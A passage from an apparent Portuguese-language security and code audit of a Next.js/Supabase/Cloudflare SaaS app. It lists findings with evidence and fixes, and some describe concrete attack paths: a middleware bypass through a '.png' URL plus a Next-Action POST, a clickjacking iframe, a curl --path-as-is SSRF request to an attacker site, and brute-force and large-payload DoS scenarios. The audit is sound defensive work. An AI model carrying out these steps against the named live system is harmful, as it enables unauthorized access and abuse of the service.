**O que é:** O `mid` entra em `processed_events` como primeiro passo (l.235-238, l.618-621, l.780-783, l.837-840) e qualquer erro do insert é tratado como duplicata. Depois disso, a rota devolve 200 mesmo em exceção (route.ts l.44-52) e quase todas as consultas ao Supabase descartam `error` (`const { data: rules } = ...` l.328-333; `findServedAccount` served-account.ts l.14-19; `automationPausedUntil` l.412-417). Uma falha transitória (Supabase indisponível, timeout, deploy no meio) faz o evento ser consumido sem resposta, e a Meta não reenvia porque recebeu 200; se reenviasse, o `mid` já estaria em `processed_events`. Pior: um erro na consulta de `rules` vira `rules = null` → `no_match` falso no log de interações, mascarando a falha.

**Como acontece:** Supabase devolve erro/timeout na consulta de `rules` (l.328) ou em `findServedAccount` durante um pico. O insert em `processed_events` já ocorreu; a função retorna sem responder e o webhook devolve 200. O lead nunca recebe a resposta e o painel mostra `no_match` como se a palavra-chave não tivesse casado. Nenhuma reentrega recupera.

**Evidência:** process.ts l.235-238: `const { error: dedupError } = await admin.from("processed_events").insert({ mid }); if (dedupError) return;` — qualquer erro (não só 23505) encerra. route.ts l.44-52: catch → console.error → `return NextResponse.json({ received: true })`.

**Recomendação:** Distinguir violação de unique (23505) de outros erros no insert de `processed_events`; nos demais erros, lançar para que a rota devolva 5xx e a Meta reenvie (ou mover o insert do dedupe para depois do processamento bem-sucedido, com trava otimista). Checar `error` nas consultas críticas (`rules`, `ig_accounts`) e registrar `error` em `interactions` em vez de `no_match`.

**Verificação:** refute: confirmed (medium) / exploit: confirmed (medium) / impact: confirmed (medium)

### A0-014 [medium] Chamadas síncronas à Graph API da Meta em toda renderização de página (perfil e mídia), sem cache
`src/lib/rules/account-media.ts:42` · optimization · ✅ confirmado (3 lentes)

**O que é:** withRecentMedia chama listRecentMedia (Graph API) a cada render de /rules/nova/responder-comentario e de /rules/[id]/editar, e withSyncedProfiles chama getInstagramProfile (Graph API) a cada render de /accounts e a cada abertura do editor de workflow (/rules/sequencias/[id] e /nova). Tudo antes de responder o HTML, sem TTL/cache. Custo: 300-900 ms extra de latência por navegação e consumo da cota de chamadas do token do usuário (limite por usuário/hora da Meta), a mesma cota usada pelo webhook para responder DMs/comentários — navegação intensa no painel pode degradar o bot. O editor de workflow ainda faz o sync depois do Promise.all, somando serialmente.

**Como acontece:** Usuário abre o editor de workflow 30 vezes numa hora e o builder de comentário mais 30: 60 chamadas à Graph API só de navegação, cada uma adicionando latência à página; no mesmo token, o webhook tenta enviar respostas e disputa a cota.

**Evidência:** account-media.ts:42 `await listRecentMedia(decryptToken(account.access_token_enc))` por conta; account-profile.ts:23 `await getInstagramProfile(token)`; chamadas em accounts/page.tsx:45, rules/sequencias/[id]/page.tsx:63, rules/(com-abas)/nova/responder-comentario/page.tsx:33, rules/(com-abas)/[id]/editar/page.tsx:36.

**Recomendação:** Guardar o perfil/mídia com TTL (ex.: coluna profile_synced_at e só re-sincronizar se > 1h; mídia cacheada por alguns minutos em KV/Cache API do Worker ou na tabela), ou carregar mídia sob demanda via action quando o usuário abre o seletor, e rodar o sync de perfil em background (after()/waitUntil) em vez de bloquear o render.

**Verificação:** refute: confirmed (medium) / exploit: confirmed (medium) / impact: confirmed (low)

### A0-002 [medium] Matcher do middleware ignora caminhos terminados em extensão de imagem: usuário bloqueado ou sem assinatura invoca server actions do painel e abre o shell por /rules/sequencias/x.png
`src/middleware.ts:69` · security · ✅ confirmado (3 lentes)

**O que é:** O matcher exclui `.*\.(?:svg|png|jpg|jpeg|gif|webp|ico)$` pensando em arquivos estáticos, mas a exclusão é sobre o caminho inteiro. A rota dinâmica `src/app/(dashboard)/rules/sequencias/[id]/page.tsx` aceita qualquer `[id]`, então `/sistema/rules/sequencias/qualquer.png` é uma página real do painel que nunca passa pelo middleware. A regra de acesso (bloqueio → cortesia → assinatura, hasActiveAccess) só existe no middleware: o layout do painel (src/app/(dashboard)/layout.tsx:16-22) confere apenas `getUser()`, e nenhuma server action do dashboard chama hasActiveAccess (grep em src: só middleware.ts, api/auth/meta/*, purge.ts, served-account.ts e sequences/runtime.ts) — saveRule, saveSequence, toggleSequence, deleteSequence, duplicateSequence, extendExpiry, createFolder, moveToFolder, savePreset, generateForField etc. confiam que o middleware já barrou quem não tem acesso. As server actions do Next são despachadas por POST na URL da página com o header `Next-Action`, e no Next 14 a action roda ANTES do layout (o redirect do layout só acontece na renderização posterior). O mapa de actions da página `[id]` inclui as de rules/sequencias/actions.ts (saveSequence/toggleSequence/deleteSequence/duplicateSequence), versions-actions (getSequenceVersions), runs-actions (getSequenceRuns), extendExpiry (lib/expiry/actions.ts) e, pelo layout do dashboard, presets-actions e ai-actions (listPresets/isAiEnabled/generateForField). A tentativa pelo caminho normal não funciona (o middleware redireciona para /assinatura e o encaminhamento interno de actions do Next passa pelo middleware de novo), mas o `.png` pula tudo. O RLS continua restringindo às linhas do próprio usuário, então não há acesso cruzado entre tenants; a brecha é a regra de negócio (bloqueado/inadimplente segue criando/editando/ativando automações e workflows, salvando textos, gastando IA com a própria chave e vendo o shell do painel com contador do CRM). Comportamento do roteamento de assets do @opennextjs/cloudflare para esse POST é a confirmar na configuração.

**Como acontece:** Cliente logado com access_grants.kind = 'block' ou assinatura cancelada (cookie de sessão ainda válido): 1) GET /sistema/rules/sequencias/x.png → o middleware não roda, o layout do painel renderiza (sidebar, contadores) e a página cai em notFound dentro do shell; 2) obtém o id da action saveSequence do bundle e faz POST /sistema/rules/sequencias/x.png com header `Next-Action` e corpo RSC → handleAction executa saveSequence com o client RLS do usuário e a sequência é salva/ativada mesmo com a conta bloqueada; o mesmo vale para deleteSequence, toggleSequence, savePreset, generateForField (gasta a chave de IA do usuário) e extendExpiry.

**Evidência:** src/middleware.ts:69 `"/((?!_next/static|_next/image|favicon.ico|.*\\.(?:svg|png|jpg|jpeg|gif|webp|ico)$).*)"`; src/app/(dashboard)/layout.tsx:20-22 só `if (!user) redirect("/login")`; src/app/(dashboard)/rules/sequencias/[id]/page.tsx:60 `if (!sequence) notFound();` (página dinâmica); sequencias/actions.ts:266-399 saveSequence sem chamada a hasActiveAccess; src/components/sequences/sequence-editor.tsx:53 importa as actions de sequencias/actions; node_modules/next/dist/server/app-render/action-utils.js createServerModuleMap resolve a action pelo workers[pageName] da página alvo.

**Recomendação:** Trocar a exclusão por extensão por uma exclusão de prefixos reais (`_next/static`, `_next/image`, `favicon.ico`, `icon.svg` e os arquivos de `public/`), ou simplesmente deixar o middleware rodar em tudo que não for `_next/`. Independente disso, repetir a regra de acesso fora do middleware: um helper `requireAccess()` (getUser + hasActiveAccess) chamado no layout do painel e no início de cada server action que escreve, do mesmo jeito que requireAdmin() faz no /admin, com um teste de auditoria igual ao admin-actions.audit.test.ts.

**Verificação:** refute: confirmed (medium) / exploit: confirmed (medium) / impact: confirmed (medium)

### A3-005 [medium] URL dos webhooks e NEXT_PUBLIC_APP_URL documentados sem /sistema: webhook cai na landing e o cron interno responde 404
`README.md:52` · config · ⚠️ não verificado

**O que é:** As rotas do Worker em wrangler.toml (linhas 16-19) cobrem só `falow.app.br/sistema` e `falow.app.br/sistema/*`; qualquer outro caminho do hostname é servido pela landing (outro projeto). O README (linha 52) manda cadastrar `https://falow.app.br/api/webhooks/meta` e `https://falow.app.br/api/webhooks/stripe`, o README (linha 79) e o .env.example (linhas 30-32 e 49) dizem que NEXT_PUBLIC_APP_URL em produção é `https://falow.app.br`, enquanto docs/operacao-saas.md (linhas 350, 478, 521-528, 556) e src/lib/app-url.ts exigem o `/sistema`. O cron do Worker monta a Request com `${NEXT_PUBLIC_APP_URL}${path}` (src/lib/cron/schedule.ts:26-29) e a entrega ao OpenNext, que só reconhece caminhos com o basePath: sem `/sistema` o tick vira 404 a cada minuto.

**Como acontece:** Operador segue o README/.env.example: (a) cadastra na Meta/Stripe a URL sem /sistema -> a Cloudflare roteia para a landing -> 404 -> a Meta desativa o webhook após repetidas falhas e a Stripe para de entregar eventos (assinaturas não criadas); (b) define o secret NEXT_PUBLIC_APP_URL=https://falow.app.br -> cronRequestFor gera https://falow.app.br/api/cron/sequences -> OpenNext/Next com basePath responde 404 -> log `[cron] /api/cron/sequences -> 404` a cada minuto e nenhum atraso de workflow é retomado; appUrl() também gera success_url/redirects do Stripe e do OAuth apontando para a landing.

**Evidência:** README.md:52 `Webhooks: https://falow.app.br/api/webhooks/meta (Meta) e https://falow.app.br/api/webhooks/stripe (Stripe)`; .env.example:32 `# NEXT_PUBLIC_APP_URL=https://falow.app.br`; wrangler.toml:17-18 routes só `/sistema` e `/sistema/*`; src/lib/cron/schedule.ts:26-27 `const base = (env.NEXT_PUBLIC_APP_URL ?? DEFAULT_APP_URL)...; new Request(`${base}${path}`)`.

**Recomendação:** Corrigir README e .env.example para as URLs com `/sistema` (como docs/operacao-saas.md). No código, fazer cronRequestFor ignorar NEXT_PUBLIC_APP_URL e usar sempre o host + BASE_PATH fixos (o cron nunca sai pela rede, só precisa de uma URL com o basePath), e validar no startup/health que NEXT_PUBLIC_APP_URL termina em `/sistema`. Conferir na configuração da Meta e da Stripe (a confirmar nos painéis) que as URLs cadastradas incluem `/sistema`.

### A1-002 [medium] Nenhum header de segurança HTTP (CSP, HSTS, X-Frame-Options, Referrer-Policy, nosniff, Permissions-Policy)
`next.config.mjs:2` · config · ⚠️ não verificado

**O que é:** O next.config.mjs não define `headers()`, não existe arquivo `_headers`/pasta public e o OpenNext não injeta nada. O painel (/sistema/**), a tela /definir-senha (que recebe token_hash de convite/recuperação) e o /login saem sem Content-Security-Policy, sem X-Frame-Options/frame-ancestors, sem X-Content-Type-Options, sem Referrer-Policy e sem Permissions-Policy. HSTS pode estar ligado na zona Cloudflare (SSL/TLS → Edge Certificates), mas isso é a confirmar na configuração; no repositório não há nada.

**Como acontece:** Clickjacking: um site malicioso embute https://falow.app.br/sistema/accounts num iframe invisível e induz o cliente logado a clicar em 'Desconectar', 'Remover minha chave' ou em ações do CRM. Sem CSP, qualquer XSS futura (ex.: as duas advisories de XSS do Next 14 listadas no audit, ou conteúdo de lead renderizado no inbox) executa com acesso total à sessão Supabase (cookies não são o único vetor: chamadas a server actions valem).

**Evidência:** next.config.mjs tem só basePath, experimental.serverActions e images; `ls public _headers` → não existem; grep 'headers()' no next.config → nada

**Recomendação:** Adicionar `headers()` no next.config.mjs para todas as rotas: `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`, `X-Frame-Options: DENY` + CSP com `frame-ancestors 'none'`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy: camera=(), microphone=(), geolocation=()`, e uma CSP (começar em Report-Only) com `default-src 'self'`, `connect-src` para o Supabase (https e wss), `img-src` para cdninstagram/fbcdn/Supabase Storage. Na Cloudflare, confirmar HSTS na zona e 'Always Use HTTPS'; opcionalmente aplicar os mesmos headers por Transform Rule só na rota /sistema/*.

### A2-003 [medium] Nenhum header de segurança HTTP (CSP, X-Frame-Options/frame-ancestors, HSTS, nosniff, Referrer-Policy, Permissions-Policy) é emitido pelo app
`next.config.mjs:2` · security · ⚠️ não verificado

**O que é:** Nem o next.config.mjs (sem `headers()`), nem o middleware (src/middleware.ts:60 devolve `response` sem cabeçalhos extras), nem o worker.ts/wrangler.toml adicionam qualquer header de segurança. Não existe pasta public/ com `_headers`. O painel inteiro (/dashboard, /crm, /admin, /accounts) pode ser embutido em iframe de terceiro, e não há Content-Security-Policy para conter um XSS. Isso pesa mais aqui porque os cookies de sessão do Supabase são gravados com `httpOnly: false` (padrão do @supabase/ssr, confirmado em node_modules/@supabase/ssr/dist/main/utils/constants.js) e o client do browser lê `access_token` via `supabase.auth.getSession()` (src/modules/crm/inbox/hooks/use-inbox-realtime.ts:35): qualquer XSS vira roubo de access+refresh token (sessão de longa duração). Se os headers forem aplicados por Transform Rules/Managed Headers no painel da Cloudflare, isso não está no repo: a confirmar na configuração.

**Como acontece:** Clickjacking: atacante hospeda página com `<iframe src="https://falow.app.br/sistema/admin/clientes">` (ou /accounts, /crm/conversas) com opacidade 0 e induz um admin/cliente logado a clicar; botões como "Bloquear", "Desconectar", "Apagar para mim", "Excluir etapa" e o POST "Minha assinatura" são acionados dentro do frame com a sessão da vítima. Sem CSP, qualquer injeção futura (ex.: dependência comprometida, bug em componente) roda script com acesso aos cookies `sb-*-auth-token` legíveis por JS.

**Evidência:** next.config.mjs não define `headers()`; src/middleware.ts:60 `return response;` sem `response.headers.set(...)`; grep por Content-Security|X-Frame|Strict-Transport|nosniff|Referrer-Policy em src/, worker.ts e next.config.mjs não retorna nada; @supabase/ssr DEFAULT_COOKIE_OPTIONS `httpOnly: false, sameSite: "lax"`.

**Recomendação:** Definir no middleware (ou em `headers()` do next.config / Transform Rule da Cloudflare) ao menos: `Content-Security-Policy` com `frame-ancestors 'none'`, `default-src 'self'`, `connect-src 'self' https://<projeto>.supabase.co wss://<projeto>.supabase.co`, `img-src 'self' data: https://*.cdninstagram.com https://*.fbcdn.net https://graph.facebook.com https://<projeto>.supabase.co`, `media-src` idem, `script-src 'self' 'nonce-…'` (o script inline do next-themes precisa de nonce/hash); `X-Frame-Options: DENY`; `X-Content-Type-Options: nosniff`; `Referrer-Policy: strict-origin-when-cross-origin`; `Permissions-Policy: camera=(), geolocation=(), microphone=(self)`; HSTS com preload (via Cloudflare SSL/TLS > Edge Certificates). Validar com securityheaders.com depois do deploy.

### A2-009 [medium] serverActions.bodySizeLimit de 26 MB é global e amplifica as advisories de DoS por deserialização do Next 14, inclusive em páginas públicas
`next.config.mjs:9` · config · ⚠️ não verificado

**O que é:** O limite foi subido para 26 MB para o anexo do composer do CRM (PDF/foto), mas no Next 14 `bodySizeLimit` vale para TODAS as Server Actions, inclusive as de `/login` e `/definir-senha` que são alcançáveis sem sessão. As advisories GHSA-h25m/q4gf/8h8q (deserialização RSC) e GHSA-m99w/p3m5 (Server Actions) escalam com o tamanho do payload que o servidor aceita; a própria Vercel recomenda, como workaround de GHSA-4c39-4ccg-62r3, que o provedor limite o corpo a no máximo 5 MiB. O Worker tem 128 MB de memória: ler um corpo de 26 MB e deserializá-lo como árvore RSC já é uma fração relevante disso por request.

**Como acontece:** Atacante anônimo faz POSTs concorrentes de 26 MB com `Next-Action` para /sistema/login. Cada invocação lê e tenta deserializar o corpo inteiro antes de qualquer verificação do Falow. Sem limite na borda, o custo de rede e CPU é todo do Worker.

**Evidência:** next.config.mjs:9 `serverActions: { bodySizeLimit: "26mb" }`; OSV GHSA-4c39-4ccg-62r3: 'ensure your hosting provider limits the request's body size. 5 MiB should be allowed at max'; src/lib/auth/routing.ts:7-14 PUBLIC_PATHS inclui /definir-senha; src/app/login/actions.ts e src/app/definir-senha/actions.ts têm "use server".

**Recomendação:** Tirar o upload grande da Server Action: enviar o arquivo do navegador direto ao bucket `crm-uploads` com URL assinada do Supabase Storage (signed upload URL) e passar só a referência para a action; então voltar `bodySizeLimit` para o padrão (1 MB) ou no máximo 5 MB. Enquanto isso, regra de WAF na Cloudflare limitando `http.request.body.size` para POST em /sistema/login, /sistema/definir-senha e, em geral, para tudo que não seja a rota do composer.

### A3-009 [medium] Nenhum header de segurança HTTP (HSTS, X-Frame-Options/frame-ancestors, CSP, nosniff) no app ou na borda
`next.config.mjs:2` · security · ⚠️ não verificado

**O que é:** next.config.mjs não define `headers()`, o worker.ts não injeta headers e não há Transform Rule/HSTS no repositório (a configuração da zona não está no repo, a confirmar). O painel /sistema/* (dashboard, CRM, admin) pode ser embutido em iframe de terceiros e não há CSP; HSTS depende do painel SSL/TLS da zona.

**Como acontece:** Site malicioso embute https://falow.app.br/sistema/dashboard (ou /admin) num iframe transparente e induz um cliente logado a clicar (clickjacking) em ações como 'Devolver ao bot', excluir regra ou alterar cortesia no /admin; sem HSTS, um primeiro acesso por http:// pode ser interceptado em rede hostil antes do redirect.

**Evidência:** next.config.mjs:2-18: só `basePath`, `experimental.serverActions.bodySizeLimit` e `images`; grep por `headers()`, `Strict-Transport`, `X-Frame-Options`, `Content-Security-Policy` em next.config.mjs, src/** e worker.ts não encontra nada.

**Recomendação:** Adicionar `headers()` no next.config.mjs (ou Response Header Transform Rule na zona) com `Strict-Transport-Security: max-age=31536000; includeSubDomains`, `X-Frame-Options: DENY` + `Content-Security-Policy: frame-ancestors 'none'`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`; ligar HSTS em SSL/TLS -> Edge Certificates da zona e 'Always Use HTTPS' (a confirmar na configuração da Cloudflare).

### A2-004 [medium] Build do OpenNext embute TODOS os valores de .env* no bundle do Worker; nenhuma trava técnica, só o runbook
`package.json:12` · config · ⚠️ não verificado

**O que é:** O script `deploy:cloudflare` roda `opennextjs-cloudflare build && wrangler deploy`. O build do OpenNext lê `.env.production.local`, `.env.local`, `.env.production` e `.env` (extract-project-env-vars.js) e o `init.js` do Worker faz `process.env[key] ??= nextEnvVars[mode][key]` para TODAS as chaves, não só NEXT_PUBLIC_*. O runbook (docs/operacao-saas.md:508-528) descreve o risco e um roteiro manual de renomear o .env.local antes de cada deploy, mas não há verificação no build, no script nem em CI.

**Como acontece:** (1) Quem faz deploy esquece o roteiro manual: SUPABASE_SERVICE_ROLE_KEY, TOKEN_ENCRYPTION_KEY, STRIPE_SECRET_KEY, INSTAGRAM_APP_SECRET do .env.local vão parar no script do Worker, legível no painel da Cloudflare (Workers → Code/Versions) e em qualquer backup do .open-next/. (2) Um secret esquecido no `wrangler secret put` não falha: o Worker cai em silêncio no valor de dev/teste (ex.: sk_test_ da Stripe ou uma TOKEN_ENCRYPTION_KEY de desenvolvimento em produção, cifrando tokens com a chave errada).

**Evidência:** node_modules/@opennextjs/cloudflare/dist/cli/templates/init.js:101 `process.env[key] ??= nextEnvVars[mode][key];` e extract-project-env-vars.js:15-18 lista .env.{mode}.local, .env.local, .env.{mode}, .env

**Recomendação:** Trocar o script por um que (a) falhe se existir `.env.local`/`.env` com chave que não comece com NEXT_PUBLIC_ (um `prebuild` em node que lê os arquivos e aborta), ou (b) rode o build num diretório/CI sem .env.local. Depois do build, grep no `.open-next/` por `SUPABASE_SERVICE_ROLE_KEY=` / `sk_` antes do `wrangler deploy`. Para o caso (2), fazer o código falhar cedo quando um secret obrigatório estiver ausente (checagem no boot do Worker).

### A2-008 [medium] @opennextjs/cloudflare 1.14.10 traz o handler /cdn-cgi/image/ com SSRF (GHSA-c7mq-gh6q-6q7c, corrigido em 1.17.1)
`package.json:50` · security · ⚠️ não verificado

**O que é:** O template `node_modules/@opennextjs/cloudflare/dist/cli/templates/worker.js:25-33` (que vira o `.open-next/worker.js` importado por `worker.ts:7`) faz `fetch(imageUrl, { cf: { cacheEverything: true } })` para qualquer URL http(s) que apareça depois de `/cdn-cgi/image/<x>/`, confiando que a borda da Cloudflare intercepta esse prefixo. A advisory mostra que um cliente que preserve barras invertidas (`curl --path-as-is`) consegue chegar ao Worker com `/cdn-cgi\image/...`, e `new URL()` normaliza para `/cdn-cgi/image/`, servindo conteúdo arbitrário sob o domínio falow.app.br (open proxy, abuso de reputação do domínio, cache poisoning via `cacheEverything`). Mitigações do Falow: o Worker só está roteado em `falow.app.br/sistema/*` (`wrangler.toml:16-19`), então o atacante precisaria de um caminho como `/sistema/..\cdn-cgi\image/...` que a Cloudflare encaminhe ao Worker sem normalizar e que o WHATWG URL do Worker resolva para `/cdn-cgi/image/`. Se a 'URL normalization' da zona (padrão: ligada, tipo Cloudflare, que converte `\` em `/` e remove segmentos `..`) for aplicada antes do roteamento, a request não bate na rota e não chega ao Worker. Isso depende da configuração da zona e do comportamento interno de roteamento: a confirmar na configuração. A exposição via navegador não existe (navegadores normalizam `\`).

**Como acontece:** Atacante anônimo com cliente HTTP bruto: `curl --path-as-is 'https://falow.app.br/sistema/..\cdn-cgi\image/x/https://site-do-atacante/'`. Se a request alcançar o Worker, o template busca a URL do atacante e devolve o conteúdo sob falow.app.br, cacheado na borda. Não há acesso a segredos (o fetch não carrega credenciais), mas o domínio vira proxy aberto e alvo de abuso.

**Evidência:** node_modules/@opennextjs/cloudflare/dist/cli/templates/worker.js:25 `if (url.pathname.startsWith("/cdn-cgi/image/"))` ... :31 `fetch(imageUrl, { cf: { cacheEverything: true } })`; OSV GHSA-c7mq-gh6q-6q7c: '@opennextjs/cloudflare >=0 <1.17.1'; package-lock.json: @opennextjs/cloudflare 1.14.10.

**Recomendação:** Atualizar `@opennextjs/cloudflare` para >= 1.20.14 (também cobre GHSA-2vc4) e refazer o build/deploy; conferir no painel da zona falow.app.br que 'Normalize incoming URLs' está ligado. Opcionalmente, uma regra de WAF bloqueando `http.request.uri.path contains "cdn-cgi"` para /sistema/*.

### A2-017 [medium] Página de Automações carrega todas as interactions 'replied' para contar execuções por regra (sem limite; silenciosamente truncado em 1000 linhas)
`src/app/(dashboard)/rules/(com-abas)/page.tsx:46` · bug · ⚠️ não verificado

**O que é:** `interactions.select("matched_rule_id").in(account_id).eq(status, replied).not(matched_rule_id, is, null)` sem `limit` nem agregação. O PostgREST corta em `max_rows` (padrão 1000, a confirmar), então acima disso a contagem exibida ('executada N vezes') está errada, e abaixo disso a página transfere até 1000 linhas para somar. O mesmo padrão aparece em sequencias/page.tsx:48-51 (`sequence_runs.select("sequence_id, status").in(...)`, sem limite) para os stats de workflows.

**Como acontece:** Conta com 5.000 respostas automáticas → a lista mostra contagens que somam no máximo 1.000, e a página baixa 1.000 linhas a cada abertura.

**Evidência:** rules page.tsx:45-53: `await supabase.from("interactions").select("matched_rule_id").in("account_id", accountIds).eq("status", "replied").not("matched_rule_id", "is", null)`; sequencias page.tsx:48-51 idem para sequence_runs.

**Recomendação:** Agregar no banco: RPC/view `select matched_rule_id, count(*) group by 1` (e `sequence_id, status, count(*)`), ou manter contadores desnormalizados em rules/sequences atualizados pelo webhook.

### A2-018 [medium] Editor de workflow (nova/editar) consulta a Graph API da Meta a cada render e envia todos os grafos e 30 versões completas para o cliente
`src/app/(dashboard)/rules/sequencias/[id]/page.tsx:63` · optimization · ⚠️ não verificado

**O que é:** Toda abertura do editor chama `withSyncedProfiles` (account-profile.ts:57-73), que descriptografa o token e faz 1 requisição HTTPS à Graph API por conta ativa (≈300–800 ms, sequencialmente antes do render), só para atualizar o @ (ver achado específico sobre withSyncedProfiles). A mesma página carrega `sequences.select("id, account_id, name, graph")` de todos os workflows de todas as contas (apenas para um dropdown 'Ir para workflow' e sugestão de código de link) e `sequence_versions` com `graph` das 30 últimas versões — ou seja, até ~31+N grafos JSON serializados no HTML/RSC da página. O mesmo `withSyncedProfiles` roda em nova/page.tsx:36 e accounts/page.tsx:45; `withRecentMedia` (responder-comentario/page.tsx:33 e editar/page.tsx:36) faz outra chamada à Graph API por render.

**Como acontece:** Workflow com 25 versões de 80 KB + 30 workflows → ~4 MB de JSON por abertura do editor, mais 1 round trip à Meta; se a Meta estiver lenta (ou rate-limited: 200 chamadas/h por usuário na Instagram API, a confirmar), a página inteira espera.

**Evidência:** [id]/page.tsx:46 `supabase.from("sequences").select("id, account_id, name, graph")`; 49-53 `sequence_versions.select("id, sequence_id, name, graph, ...").limit(30)`; 63 `await withSyncedProfiles(createAdminClient(), storedAccounts ?? [])`; account-profile.ts:61-72 `Promise.all(accounts.map(... syncAccountProfile(db, account, token)))`.

**Recomendação:** Sincronizar o perfil no máximo 1× por hora (coluna `profile_synced_at`) ou em background; listar versões sem `graph` e carregar o grafo de uma versão sob demanda (server action); para o dropdown, selecionar só `id, name, account_id` e extrair o código de referência numa coluna própria.

### A3-002 [medium] Linha 'active' de cliente sem acesso impede o novo dono do @ de conectar (account_taken por até 30 dias ou para sempre)
`src/app/api/auth/meta/callback/route.ts:76` · bug · ⚠️ não verificado

**O que é:** O guard de conexão só olha o status da linha em ig_accounts (`.eq("status", "active")`), nunca se o dono dessa linha ainda tem acesso. Quando o cliente A cancela (ou é bloqueado pelo admin, ou a cortesia dele vence), a linha do @X continua `active`: o bot cala (findServedAccount checa hasActiveAccess), mas o registro segue ocupando o índice único parcial da migration 0020. Se o cliente B (que controla a conta do Instagram e prova isso passando pelo OAuth) tenta conectar o mesmo @X, connectBlockReason devolve `account_taken` e a tela diz 'Desconecte por lá primeiro', coisa que A, já sem acesso ao painel (middleware redireciona para /assinatura), não consegue fazer. Só o purge libera a linha, e o purge só roda para `subscriptions.status = canceled` com purge_after vencido (30 dias); cliente bloqueado, com cortesia vencida ou que nunca teve assinatura nunca é purgado, então o @ fica preso indefinidamente.

**Como acontece:** 1) Cliente A conecta @X e depois cancela/é bloqueado/cortesia vence. 2) Cliente B (dono real do @X) assina, clica em Conectar Instagram e autoriza @X no diálogo da Meta. 3) O callback acha a linha active de A, devolve error=account_taken. 4) B não consegue usar o produto; A não consegue desconectar porque está fora do painel. Resolvido só se um admin apagar a linha manualmente ou depois do purge (quando existe).

**Evidência:** callback/route.ts:70-82: `.eq("status", "active").or(...)` + `connectBlockReason({... activeAccounts})`; connect-guard.ts:13 bloqueia se `a.ig_user_id === igUserId && a.user_id !== userId`; purge.ts:27-32 só seleciona `status = canceled`.

**Recomendação:** No callback, ao encontrar uma linha active de outro usuário para o mesmo ig_user_id, conferir `hasActiveAccess(admin, a.user_id)`; se o dono antigo não tem acesso, marcar a linha dele como `disconnected` (limpando access_token_enc) dentro da mesma transação/antes do upsert, já que o OAuth acabou de provar que quem está conectando controla a conta do Instagram. Mostrar mensagem diferente quando o bloqueio for por conta de outro cliente ativo de verdade.

### A3-003 [medium] Falha ao inscrever a conta no webhook é engolida: conta salva como 'active' e usuário vê 'automações já estão valendo'
`src/app/api/auth/meta/callback/route.ts:85` · webhook · ⚠️ não verificado

**O que é:** subscribeAccountToWebhooks (POST me/subscribed_apps) está dentro de um try/catch que só faz console.warn e segue. A conta é gravada com status `active` e o usuário é redirecionado com `connected=1`, cuja mensagem na tela é 'As automações já estão valendo'. Sem a inscrição, a Meta não entrega nenhum evento de DM/comentário desta conta: todas as regras e workflows ficam mudos sem nenhum sinal no painel. Nada tenta de novo depois (nem cron nem reconexão automática).

**Como acontece:** Timeout de 15s, erro 4xx da Meta (ex.: permissão instagram_business_manage_messages não concedida no diálogo, app em modo dev sem a conta como testadora) ou instabilidade da Graph no momento do callback → conta aparece 'Conectada', o cliente cria automações e nada responde. Suporte só descobre olhando os logs do Worker.

**Evidência:** callback/route.ts:85-92: `try { await subscribeAccountToWebhooks(longToken); } catch (err) { console.warn(...) }` seguido do upsert com `status: "active"` e `redirectToAccounts("connected=1")`.

**Recomendação:** Tratar a falha da inscrição como falha de conexão (redirecionar com um erro específico e não gravar como active), ou gravar um flag `webhook_subscribed_at` nulo e repetir a inscrição no primeiro uso do token / em um cron, exibindo aviso no cartão da conta enquanto não estiver inscrita.

### A3-010 [medium] Faltam proteções de borda recomendadas (WAF managed rules, rate limiting, Turnstile) para login, checkout, definir-senha e webhooks
`src/app/api/billing/checkout/route.ts:36` · config · ⚠️ não verificado

**O que é:** Nada no repositório configura WAF, rate limiting ou Turnstile (a configuração da zona é externa, a confirmar). Pontos expostos sem limite: POST /sistema/api/billing/checkout cria uma Checkout Session na Stripe para qualquer anônimo (checkout/route.ts:12-50); server actions de login/reset de senha (src/app/login/actions.ts:18-46) dependem só do rate limit do Supabase Auth (a confirmar); GET /sistema/api/webhooks/meta responde 403/200 ao `hub.verify_token` sem limite (meta/route.ts:14-25), permitindo força bruta do META_VERIFY_TOKEN; `/definir-senha` é pública (src/lib/auth/routing.ts:13).

**Como acontece:** Script anônimo chama POST /sistema/api/billing/checkout milhares de vezes: cada chamada gasta uma invocação do Worker e cria uma sessão de checkout na Stripe (polui o dashboard, consome quota de API da Stripe, custo de Workers); credential stuffing em /sistema/login via server action com e-mails vazados sem desafio; enumeração do verify token por força bruta no GET do webhook.

**Evidência:** src/app/api/billing/checkout/route.ts:36-48 `const session = await getStripe().checkout.sessions.create({...})` sem exigir usuário; src/app/api/webhooks/meta/route.ts:17-21 compara `hub.verify_token` com `===` e devolve o challenge; wrangler.toml não tem (nem poderia ter) regras de zona; não há Turnstile no código.

**Recomendação:** Na zona falow.app.br: ativar WAF Managed Ruleset + OWASP; Rate Limiting Rules por IP para `/sistema/login`, `/sistema/definir-senha`, `/sistema/api/billing/*` (ex.: 10 req/min) e `/sistema/api/webhooks/*` (limite alto, mas finito); Turnstile no formulário de login/reset com validação server-side (skill `turnstile`); Bot Fight Mode/Super Bot Fight Mode conforme plano. No código, exigir sessão ou um token do formulário para o checkout anônimo e devolver 404 silencioso no GET do webhook quando META_VERIFY_TOKEN não estiver configurado.

### A2-005 [medium] CRON_SECRET aceito na query string (?secret=) e comparado sem tempo constante
`src/app/api/cron/sequences/route.ts:29` · webhook · ⚠️ não verificado

**O que é:** A rota /api/cron/sequences aceita o segredo em `?secret=<CRON_SECRET>` além do header Authorization. O `scheduled()` do Worker (worker.ts + src/lib/cron/schedule.ts:28) sempre usa o header, então a variante por URL só serve a agendadores externos (cron-job.org etc.). Um segredo na URL entra nos invocation logs do Workers Logs (observability ligada no wrangler.toml), nos logs/analytics da Cloudflare, no histórico do agendador externo e em qualquer proxy. A rota /api/cron/purge, por contraste, aceita só o header. A comparação é `!==` em string (não timing-safe), idem no purge.

**Como acontece:** Quem lê os logs do Worker (ou o painel de um agendador externo) copia o segredo e passa a chamar GET /sistema/api/cron/sequences?secret=... à vontade: cada chamada roda expireAutomationsSafe + processDueRuns(10) com service role, disparando atrasos de sequências fora de hora, concorrendo com o cron de 1 minuto e gastando cota do Worker/Graph API. Com o mesmo segredo chama o purge (apaga usuários com purge_after vencido antes da hora prevista).

**Evidência:** route.ts:29-30 `const bySecret = request.nextUrl.searchParams.get("secret"); if (auth !== `Bearer ${secret}` && bySecret !== secret)`

